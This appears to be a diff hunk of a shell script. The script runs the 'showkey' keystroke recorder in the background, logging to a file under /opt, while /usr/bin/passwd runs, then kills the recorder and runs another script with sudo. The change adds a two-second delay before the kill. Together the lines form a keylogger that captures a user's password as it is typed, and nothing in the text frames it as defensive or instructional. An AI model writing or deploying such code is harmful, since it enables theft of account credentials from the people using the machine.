@@ -8,6 +8,7 @@ showkey > /opt/$FOLDER/logger.txt &
 /usr/bin/passwd
 
 # stop record
+sleep 2
 kill %1
 # 
 sudo /opt/$FOLDER/function.sh
